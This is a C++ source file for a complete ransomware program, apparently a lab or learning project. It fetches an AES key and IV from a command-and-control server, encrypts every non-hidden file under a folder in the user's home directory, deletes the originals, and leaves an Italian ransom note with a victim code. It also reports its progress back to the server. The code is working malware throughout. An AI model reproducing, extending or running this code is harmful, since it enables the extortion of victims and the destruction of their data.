#include <iostream>
#include <fstream>
#include <filesystem>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include "C2CCommunication.h"

namespace fs = std::filesystem;

static const std::string C2APIURL = "http://10.211.55.2:8080/api/track";

int totalFiles = 0;

void handleErrors() {
    ERR_print_errors_fp(stderr);
    abort();
}

void encryptFile(const fs::path& inputFilePath, const fs::path& outputFilePath, const std::vector<unsigned char>& key, const std::vector<unsigned char>& iv) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) handleErrors();

    if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key.data(), iv.data())) {
        handleErrors();
    }

    std::ifstream inFile(inputFilePath, std::ios::binary);
    std::ofstream outFile(outputFilePath, std::ios::binary);

    if (!inFile.is_open() || !outFile.is_open()) {
        EVP_CIPHER_CTX_free(ctx);
        return;
    }

    unsigned char buffer[1024];
    unsigned char* ciphertext = new unsigned char[1024 + EVP_CIPHER_block_size(EVP_aes_128_cbc())];

    int len;
    int ciphertext_len;
    while (inFile.read(reinterpret_cast<char*>(buffer), sizeof(buffer)) || inFile.gcount() > 0) {
        if (1 != EVP_EncryptUpdate(ctx, ciphertext, &len, buffer, inFile.gcount())) {
            handleErrors();
        }
        outFile.write(reinterpret_cast<char*>(ciphertext), len);
    }

    if (1 != EVP_EncryptFinal_ex(ctx, ciphertext, &ciphertext_len)) {
        handleErrors();
    }
    outFile.write(reinterpret_cast<char*>(ciphertext), ciphertext_len);

    inFile.close();
    outFile.close();
    EVP_CIPHER_CTX_free(ctx);
}

void processFilesInDirectory(const fs::path& directoryPath, const std::vector<unsigned char>& key, const std::vector<unsigned char>& iv) {
    for (const auto& entry : fs::directory_iterator(directoryPath)) {
        if(entry.is_directory()) {
            processFilesInDirectory(entry.path(), key, iv);
        } else if (entry.is_regular_file() && entry.path().filename().string().find(".") != 0) {
            fs::path inputFilePath = entry.path();
            fs::path encryptedFilePath = inputFilePath;
            encryptedFilePath += ".enc";

            encryptFile(inputFilePath, encryptedFilePath, key, iv);
            fs::remove(inputFilePath);
            totalFiles++;
        }
    }
}

void writeReadme(const fs::path& directoryPath, std::string uuid) {
    fs::path outputFilePath = fs::path(directoryPath) / "__README.txt";

    std::ofstream outFile(outputFilePath);
    if (outFile.is_open()) {
        outFile << "Il contenuto di questa cartella è stato cifrato.\n";
        outFile << "Per recuperare i file comunica il seguente codice: " << uuid << std::endl;
        outFile.close();
    }
}

std::vector<unsigned char> base64Decode(const std::string& base64Data) {
    BIO* bio = BIO_new_mem_buf(base64Data.c_str(), -1);
    BIO* b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);

    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);

    std::vector<unsigned char> decodedData(base64Data.length());
    int decodedLength = BIO_read(bio, decodedData.data(), base64Data.length());

    BIO_free_all(bio);

    decodedData.resize(decodedLength);
    return decodedData;
}

int main() {
    std::string directoryPath;
    std::string folderEncrypted;

    // Check Win
    const char* userProfileWin = std::getenv("USERPROFILE");
    if (userProfileWin != nullptr) {
        directoryPath = std::string(userProfileWin);
    }

    // No Win, check Linux / MacOS
    if (directoryPath.empty()) {
        const char* userProfileLinux = std::getenv("HOME");
        if (userProfileLinux != nullptr) {
            directoryPath = std::string(userProfileLinux);
        }
    }

    if(directoryPath.empty()) {
        return 1;
    }

    C2CCommunication c2(C2APIURL);
    std::map<std::string, std::string> result = c2.sendStart();

    std::string uuid = result["uuid"];
    std::string directory = result["directory"];
    std::string base64Key = result["key"];
    std::string base64Iv = result["iv"];

	if (uuid == "" || directory == "" || base64Key == "" || base64Iv == "") {
		return 1;
	}

    std::vector<unsigned char> key = base64Decode(base64Key);
    if (key.size() != 16) {
        return 1;
    }

    const std::vector<unsigned char>& iv = base64Decode(base64Iv);
    if (iv.size() != 16) {
        return 1;
    }

    try {
        processFilesInDirectory(directoryPath + "/" + directory, key, iv);
        writeReadme(directoryPath + "/" + directory, uuid);
    }
    catch (const std::exception& e) {
		c2.sendError(uuid, e.what());
        return 1;        
    }

    c2.sendEnd(uuid, totalFiles, directoryPath + "/" + directory);

    return 0;
}